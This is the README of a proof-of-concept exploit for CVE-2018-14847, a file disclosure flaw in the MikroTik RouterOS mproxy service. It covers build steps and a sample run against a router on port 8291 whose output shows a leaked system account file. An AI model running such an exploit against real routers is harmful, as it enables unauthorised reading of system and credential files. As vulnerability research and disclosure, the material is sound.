# CVE-2018-14847 Proof of Concept

This is an implementation of CVE-2018-14847 which is a file disclosure vulnerability affecting the mproxy binary in Router OS up to 6.42. 

## Compilation
This code was tested on Ubuntu 18.04. There is a dependency on boost, gtest, and cmake. Simply install them like so:

```sh
sudo apt install libboost-dev cmake
```

To compile simply do the following:

```sh
cd mproxy_file_disclosure
mkdir build
cd build
cmake ..
```

## Usage

```sh
albinolobster@ubuntu:~/mikrotik/mproxy_file_disclosure/build$ ./mproxy_file_disclosure --ip 192.168.1.103 --port 8291

=== File Contents (size: 69) ===
nobody:*:99:99:nobody:/tmp:/bin/sh
root::0:0:root:/home/root:/bin/sh
```
